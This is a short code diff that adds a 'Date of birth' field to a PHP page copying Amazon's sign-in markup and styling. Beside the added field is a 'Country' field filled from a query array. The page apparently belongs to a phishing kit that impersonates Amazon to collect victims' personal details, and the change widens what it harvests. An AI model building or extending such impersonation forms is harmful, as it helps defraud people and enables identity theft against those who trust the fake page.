@@ -292,6 +292,12 @@ amzn.copilot.checkCoPilotSession();
 <BR/><BR/>
 
 <label for="ap_email">
+              Date of birth
+            </label>
+<input type="text"  name="dob" tabindex="1" placeholder="MM/DD/YYYY" class="a-input-text a-span12 auth-autofocus auth-required-field">
+<BR/><BR/>
+
+<label for="ap_email">
              Country
             </label>
 <input type="text"  name="country" tabindex="1" value="<?php if(!empty($query['country'])){echo $query['country']; } 
